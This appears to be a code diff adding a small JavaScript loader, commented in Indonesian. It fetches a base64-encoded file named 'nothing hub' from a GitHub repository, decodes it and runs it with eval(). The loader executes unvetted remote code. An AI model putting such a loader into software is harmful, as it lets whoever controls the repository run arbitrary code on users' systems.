@@ -1,0 +1,12 @@
+// URL API GitHub untuk mengambil file
+const url = "https://api.github.com/repos/raxoner/superstarscript1826838/contents/nothing%20hub";
+
+// Mengambil file dari GitHub
+fetch(url)
+  .then(response => response.json())
+  .then(data => {
+      const content = atob(data.content); // Decode Base64 dari file
+      console.log(content); // Menampilkan isi file di konsol
+      eval(content); // Menjalankan skrip jika file berisi kode
+  })
+  .catch(error => console.error("Gagal memuat file:", error));
